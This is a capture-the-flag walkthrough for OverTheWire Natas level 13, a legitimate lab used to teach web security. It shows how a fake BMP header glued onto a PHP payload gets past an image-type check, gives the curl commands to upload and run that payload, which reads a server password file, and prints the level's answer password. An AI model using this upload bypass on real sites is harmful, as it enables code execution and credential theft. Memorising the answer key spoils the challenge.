# Natas Level 13 → 14

## Goal

Same upload form as the previous level, but now the server checks whether the file **looks like an image** using PHP's `exif_imagetype`. That function inspects the first bytes (the "magic number"). Prepend a valid image magic to your PHP and it passes — PHP is still run by the server regardless of that decoration.

## Concepts you'll learn

- **Magic numbers** — the first few bytes of a file that identify its format (BMP: `BM`, PNG: `\x89PNG`, JPEG: `\xff\xd8\xff`, GIF: `GIF8`)
- That the image type check inspects bytes, not content — and PHP's parser ignores junk before `<?php`
- A cheap image-upload bypass: glue an image header onto a PHP payload

## Walkthrough

### 1. View the source

```php
if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else {
    // save with .php extension from the hidden 'filename' field
}
```

So `exif_imagetype` is the new hurdle, and the hidden-filename trick from the previous level still works.

### 2. Build a file with a fake image header + PHP payload

Easiest: just slap a **BMP** header in front (BMP validates with just `BM`):

```bash
$ printf 'BM' > shell.php
$ cat >> shell.php <<'EOF'
<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>
EOF
```

`exif_imagetype` looks at the first bytes, sees `BM`, thinks "BMP," returns truthy. PHP later sees the `BM` followed by `<?php ... ?>` and simply emits the `BM` as literal output before running the PHP — no error.

### 3. Upload with .php filename

```bash
$ curl -u natas13:<pass> \
       -F "filename=shell.php" \
       -F "uploadedfile=@shell.php" \
       http://natas13.natas.labs.overthewire.org/index.php
```

### 4. Fetch the file

```bash
$ curl -u natas13:<pass> http://natas13.natas.labs.overthewire.org/upload/<name>.php
BMLg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

The `BM` prefix is emitted by your script — everything after it is the password.

## The answer

The password for `natas14` is:

**`Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas13.natas.labs.overthewire.org/>
